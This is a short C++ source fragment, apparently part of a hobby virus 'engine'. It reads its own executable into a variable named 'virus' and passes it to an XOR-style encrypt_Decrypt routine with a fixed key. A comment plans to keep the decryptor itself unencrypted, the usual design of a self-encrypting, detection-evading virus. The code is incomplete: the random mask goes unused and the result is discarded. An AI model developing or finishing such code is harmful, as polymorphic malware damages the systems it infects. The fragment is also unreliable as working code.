#include "engine.h"
/*must call encrypt_Decrypt, but make sure it does not encrypt encrypt_Decrypt itself.
  So, sentinel i must somehow be controlled, or the read string must be sliced.
 */
 namespace engine {
 
 int activateEngine() {
 	
 	std::string path = path::get_selfpath();
 	std::string virus = fmanip::read(path);
 	char mask = getRandom();
 	std::string ch = encrypt_Decrypt(virus, 'k');
 return 0;
 }
 
 } //namespace engine
